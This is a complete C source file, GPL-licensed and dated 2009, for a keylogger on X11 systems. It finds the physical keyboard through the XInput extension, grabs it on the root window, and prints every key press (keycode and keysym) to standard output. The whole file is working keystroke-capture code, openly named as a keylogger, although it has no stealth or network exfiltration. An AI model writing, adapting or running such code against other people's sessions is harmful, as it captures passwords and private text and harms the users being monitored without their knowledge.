/*
 * keylogger_Xi.c - A `XGrabDevice()`-based (XInput) keylogger
 *
 * Copyright (C) 2009  Javier Lopez-Gomez
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 */

#include <X11/Xlib.h>
#include <X11/extensions/XInput.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
  Display *display;
  Window root_window;
  Atom xi_keyboard;
  XDeviceInfo *DI;
  int nr_devices, i, ret;
  XID dev_id = None;
  XDevice *dev;
  int type_KeyPress;
  XEventClass event_list[1];
  XEvent e;

  display = XOpenDisplay(NULL);
  if (!display) {
    fprintf(stderr, "could not open connection to X server\n");
    goto err_XOpenDisplay;
  }
  root_window = XDefaultRootWindow(display);
  xi_keyboard = XInternAtom(display, XI_KEYBOARD, /*onlyIfExists=*/False);

  DI = XListInputDevices(display, &nr_devices);
  for (i = 0; i < nr_devices; ++i) {
    // FIXME: we may do better at choosing a device using XInput2 instead
    const Bool use = strcasestr(DI[i].name, "keyboard") && !strcasestr(DI[i].name, "virtual");
    if (DI[i].type == xi_keyboard && use) {
      fprintf(stderr, "%s (%lu)\n", DI[i].name, DI[i].id);
      dev_id = DI[i].id;
      break;
    }
  }
  XFreeDeviceList(DI);
  if (dev_id == None) {
    fprintf(stderr, "could not find an appropiate device\n");
    goto err_XListInputDevices;
  }

  dev = XOpenDevice(display, dev_id);
  if (!dev) {
    fprintf(stderr, "could not open device\n");
    goto err_XOpenDevice;
  }
  DeviceKeyPress(dev, type_KeyPress, event_list[0]);
  if ((ret = XGrabDevice(display, dev, root_window, /*ownerEvents=*/True, 1, event_list, GrabModeAsync, GrabModeAsync,
                         CurrentTime)) != GrabSuccess) {
    fprintf(stderr, "XGrabDevice() returned %d!\n", ret);
    goto err_XGrabDevice;
  }

  while (XNextEvent(display, &e) == 0) {
    if (e.type == type_KeyPress) {
      const XDeviceKeyPressedEvent *DKP = (XDeviceKeyPressedEvent *)&e;
      const KeySym KS = XKeycodeToKeysym(display, DKP->keycode, 0);
      printf("Keycode = %d\tKeySym = %lu (%s)\n", DKP->keycode, KS, XKeysymToString(KS));
    }
  }

  XUngrabDevice(display, dev, CurrentTime);
  XCloseDevice(display, dev);
  XCloseDisplay(display);
  return EXIT_SUCCESS;

err_XGrabDevice:
  XCloseDevice(display, dev);
err_XOpenDevice:
err_XListInputDevices:
  XCloseDisplay(display);
err_XOpenDisplay:
  return EXIT_FAILURE;
}
